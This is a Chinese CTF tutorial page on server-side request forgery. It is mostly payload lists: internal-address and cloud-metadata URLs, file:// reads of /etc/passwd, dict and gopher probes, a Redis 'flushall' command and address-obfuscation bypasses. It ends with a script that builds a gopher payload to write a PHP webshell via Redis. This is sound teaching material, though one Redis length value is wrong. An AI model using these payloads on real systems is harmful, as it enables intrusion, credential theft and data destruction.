---
title: SSRF 服务端请求伪造
order: 7
icon: mdi:server-network
category:
  - CTF
  - 手册
  - Web
---

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者让服务器代替自己发起请求，从而访问攻击者本来无法直接访问的内部资源。

## 漏洞原理

```python
# 漏洞代码：服务器根据用户提供的 URL 发起请求
url = request.args.get('url')
response = requests.get(url)
return response.text
```

正常用途：`?url=https://example.com/image.jpg`（抓取外部图片）

攻击用途：`?url=http://127.0.0.1/admin`（访问内网服务）

## 常见攻击目标

```
# 访问内网服务
?url=http://127.0.0.1/
?url=http://localhost/admin
?url=http://192.168.1.1/

# 读取本地文件
?url=file:///etc/passwd
?url=file:///flag

# 访问云服务器元数据（AWS/阿里云）
?url=http://169.254.169.254/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/

# 探测内网端口
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:8080/   # 内网 Web
```

## 协议利用

```
# file:// 读本地文件
?url=file:///etc/passwd

# dict:// 探测端口（返回 banner）
?url=dict://127.0.0.1:6379/info

# gopher:// 发送任意 TCP 数据（最强大）
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# http/https 访问内网
?url=http://10.0.0.1:8080/api/admin
```

## 绕过过滤

### IP 地址绕过

```
# 127.0.0.1 的各种写法
http://0/
http://0.0.0.0/
http://127.1/
http://2130706433/          # 十进制
http://0x7f000001/          # 十六进制
http://0177.0.0.1/          # 八进制
http://[::1]/               # IPv6

# 利用 DNS 重绑定
http://127.0.0.1.nip.io/    # 解析到 127.0.0.1
```

### 协议/域名绕过

```
# 利用跳转
?url=http://attacker.com/redirect   # 302 跳转到内网地址

# URL 解析差异
?url=http://attacker.com@127.0.0.1/
?url=http://127.0.0.1#attacker.com
```

## 利用 Redis 写 WebShell

当内网有 Redis 且无密码时，通过 gopher 协议发送命令：

```python
import urllib.parse

# Redis 命令：设置 WebShell
cmd = """
*3\r\n$3\r\nSET\r\n$9\r\nshell.php\r\n$24\r\n<?php system($_GET[0]);?>\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n
*1\r\n$4\r\nSAVE\r\n
"""
payload = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(cmd)
```

## 课后练习

- [让服务器帮我访问](http://172.16.173.140/training/11?challenge=44) — 服务器会抓取你提供的 URL，利用它访问内网资源

## 练手资源

- CTFHub SSRF 技能树
- 攻防世界 SSRF 题目
